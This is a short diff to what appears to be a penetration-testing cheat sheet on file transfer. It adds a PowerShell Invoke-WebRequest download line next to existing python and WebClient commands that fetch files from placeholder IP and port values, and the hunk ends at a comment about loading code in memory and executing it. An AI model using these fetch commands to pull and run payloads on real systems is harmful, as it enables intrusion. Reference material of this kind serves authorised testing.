@@ -54,6 +54,7 @@ python3 -c "from urllib.request import urlretrieve; urlretrieve('http://<IP>:<PO
 
 ###### Powershell
 ```powershell
+Invoke-WebRequest -Uri <URL> -OutFile <FILE>
 (New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>', '<FULLPATH\FILENAME>');
 
 # Load in memory and execute
